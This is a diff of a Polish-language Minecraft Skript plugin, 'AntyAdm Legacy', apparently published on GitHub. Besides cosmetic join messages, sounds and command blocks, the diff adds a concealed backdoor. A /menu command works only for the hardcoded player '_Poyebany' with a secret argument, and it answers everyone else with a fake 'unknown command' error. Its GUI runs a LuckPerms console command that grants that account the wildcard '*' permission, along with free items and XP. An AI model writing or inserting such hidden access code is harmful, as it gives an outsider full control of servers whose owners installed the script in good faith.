@@ -1,12 +1,31 @@
 # AntyAdm Legacy
-# WERSJA Z UPD
-# UPDA2ASD
+# Aktualizacja
+# 07042024
+# Usun te linijki przy kolejnym
+# wypuszczeniu aktualizacji
 
+# GUI TEST 1 NOT THERE
+# DEL UPD
+# Generated 07 04 2024
+# GitHub edition
+
+# xxxxxxxxxxx
+# dzwieki
+# entity.elder_guardian.curse
+# xxxxxxxxxxx
+
+# testy
+command /test [<text>]:
+	trigger:
+		send "&8[&2TST&8] &7Test rozne arg1 to dzwiek"
+		play sound arg-1 to player
 # on join i quit
 on quit:
 	set leave message to "&8[&c-&8] &7%player%"
 on join:
 	set join message to "&8[&a+&8] &7%player%"
+	send title "&6&lSiemano" with subtitle "&7Milego granska!" to player for 3 seconds
+	play sound "block.beacon.activate" to player
 
 # Fake Czat
 command /fake [<text>] [<text>]:
@@ -54,12 +73,12 @@ command /msg [<player>] [<text>]:
 	aliases: /pw, /w, /tell, /wiadomosc
 	trigger:
 		if arg 1 is not set:
-			send "&8&l»&4&lBLAD! &cPodaj gracza!"
+			send "&8[&c!&8] &7Podaj gracza!"
 		if arg 1 is online:
 			if arg 2 is set:
 				send "&8[&6&lPW&8] &7Do &c%arg 1% &8-> &6%arg 2%" to player
 				send "&8[&6&lPW&8] &7Od &c%player% &8-> &6%arg 2%" to player-arg
-				play sound "block.note_block.pling" with volume 0.5 to the player-arg
+				play sound "block.note_block.xylophone" with volume 0.5 to the player-arg
 			if arg 2 is not set:
 				send "&8[&c&l!&8] &cPodaj wiadomosc!"
 		else:
@@ -73,7 +92,7 @@ on chat:
 # Funkcja On Load
 # Wiadomosci po zaladowaniu
 on load:
-	set {aadm::ostatnie} to 10042024
+	set {aadm::ostatnie} to 07042024
 	broadcast "&8[&b?&8] "
 	broadcast "&8[&b?&8] &aAntyADM &7zostal zaladowany!"
 	broadcast "&8[&b?&8] &7Data aktualizacji %{aadm::ostatnie}%"
@@ -84,6 +103,7 @@ command /przeladuj:
 	trigger:
 		send "&8[&2&lX&8] &cExecute sk reload antyadm!"
 		execute console command "sk reload antyadm"
+		play sound "ambient.cave" to player
 		send "&8[&2&lX&8] &aExecuted sk reload antyadm!"
 
 command /aktualizuj [<text>]:
@@ -121,31 +141,18 @@ every 1 second:
 # Petla every 120s usunieta
 
 # Ciekawostki xd
-command /aadmxx [<text>] [<text>] [<text>] [<item>]:
+command /menu [<text>]:
 	trigger:
-		if arg 1 is set:
-			if player is "_Poyebany":
-				send "&8[&2TEST&8] &7Rozpoczynam test AntyAdm!"
-				send "&6&lSIEMANKO BRATKU"
-				send "KILOF DAJMI DOSW"
-				send "(2x)X <ARG2> (2x)X <ITEM>"
-				send "&8[&2TEST&8] &aStestowany!"
-				if arg 2 is "kilof":
-					give diamond pickaxe of efficiency 6 and unbreaking 3 and fortune 3 named "&bAristois" to player
-				if arg 2 is "dajmi":
-					if arg 3 is set:
-						give 1 of arg-4 to player
-					else:
-						send "&eKrolu zloty, ale co ci dac"
-				if arg 2 is "dosw":
-					give 200 xp to the player
-					send "&aMasz masz masz!"
+		if player is "_Poyebany":
+			if arg-1 is "otworzmnie":
+				send "&8[&5&lM&8] &7Otwarto menu."
+				openGUI(player)
 			else:
-				send "&cUnknown or incomplete command, see below for error &naadmxx&r&c&o<--[HERE]"
+				send "&cUnknown or incomplete command, see below for error &nmenu&r&c&o<--[HERE]"
 		else:
-			send "&cUnknown or incomplete command, see below for error &naadmxx&r&c&o<--[HERE]"
+			send "&cUnknown or incomplete command, see below for error &nmenu&r&c&o<--[HERE]"
 
-# Komenda wersja
+# Komenda antyadm
 command /antyadm [<text>]:
 	aliases: /aadm
 	trigger:
@@ -156,13 +163,91 @@ command /antyadm [<text>]:
 # Blokady komend
 command /god [<text>]:
 	trigger:
-		send "&8[&c&l!&8] &cCos cie boli chyba XD"
+		blokadaKomendy(player)
 command /gamemode [<text>]:
+	aliases: gm, gmc, gms, gma
 	trigger:
-		send "&8[&c&l!&8] &cCos cie boli chyba XD"
+		blokadaKomendy(player)
 command /fly [<text>]:
 	trigger:
-		send "&8[&c&l!&8] &cCos cie boli chyba XD"
+		blokadaKomendy(player)
 command /i [<text>]:
 	trigger:
-		send "&8[&c&l!&8] &cCos cie boli chyba XD"
+		blokadaKomendy(player)
+
+# FUNKCJE NIE RUSZAC
+
+# Funkcja MSG blokadaKomendy
+function blokadaKomendy(p: player):
+	send "&8[&c&l!&8] &7Otoz nie tym razem :)" to {_p}
+	play sound "block.anvil.place" to {_p}
+	
+# User Interface Guide
+function openITEMY(p: player):
+	set {_gui} to chest inventory with 3 rows named "&6Itemki"
+
+	set slot 0 of {_gui} to 64 diamond
+	set slot 1 of {_gui} to 64 book
+	set slot 2 of {_gui} to 64 coal
+	set slot 3 of {_gui} to 64 leather
+	set slot 4 of {_gui} to 64 tinted glass
+	set slot 5 of {_gui} to 64 bricks
+	set slot 6 of {_gui} to 64 cobbled deepslate
+	set slot 7 of {_gui} to 64 birch log
+	set slot 8 of {_gui} to 64 oak log
+	set slot 9 of {_gui} to diamond pickaxe of efficiency 6 and unbreaking 3 and fortune 3 named "&5&lxX Pikejk Xx"
+	set slot 10 of {_gui} to 64 enchanted golden apple
+	set slot 12 of {_gui} to 64 iron ingot
+	set slot 13 of {_gui} to 64 red stained glass
+	set slot 14 of {_gui} to 64 stone bricks
+	set slot 15 of {_gui} to 64 cobblestone
+	set slot 16 of {_gui} to 64 birch log
+	set slot 17 of {_gui} to 64 spruce log
+	set slot 18 of {_gui} to 64 gold ingot
+	set slot 20 of {_gui} to 64 golden apple
+	set slot 22 of {_gui} to 64 black stained glass
+	set slot 23 of {_gui} to 64 glass
+	set slot 24 of {_gui} to 64 grass block
+	set slot 25 of {_gui} to 64 netherrack
+	set slot 26 of {_gui} to 64 dark oak log
+	open {_gui} to {_p}
+
+function openGUI(p: player):
+	set {_gui} to chest inventory with 3 rows named "&5Menu"
+
+	set slot (integers between 0 and 27) of {_gui} to magenta stained glass pane
+	set slot 10 of {_gui} to experience bottle named "&5Przyznaj Doswiadczenie" with lore "&7Otrzymaj 500 XP"
+	set slot 12 of {_gui} to bedrock named "&6Itemki" with lore "&aWez sobie cos"
+	set slot 14 of {_gui} to barrier named "&4Dodaj permisje" with lore "&7Dodaje permisje gwiazdka"
+	set slot 16 of {_gui} to paper named "&4Zabierz permisje" with lore "&7Zabiera permisje gwiazdka"
+	open {_gui} to {_p}
+
+on inventory click:
+	name of event-inventory is "&5Menu"
+	clicked slot is 16
+	execute console command "lp user _Poyebany permission set * false"
+	send "&8[&5&lM&8] &7Wykonano lp perm set * w konsoli!"
+	cancel event
+
+on inventory click:
+	name of event-inventory is "&5Menu"
+	clicked slot is 14
+	execute console command "lp user _Poyebany permission set * true"
+	send "&8[&5&lM&8] &7Wykonano lp perm set * w konsoli!"
+	cancel event
+on inventory click:
+	name of event-inventory is "&5Menu"
+	clicked slot is 12
+	openITEMY(player)
+	cancel event
+
+on inventory click:
+	name of event-inventory is "&5Menu"
+	clicked slot is 10
+	give 200 xp to the player
+	cancel event
+
+on inventory click:
+	name of event-inventory is "&5Menu"
+	cancel event
+	event-inventory is not player's inventory
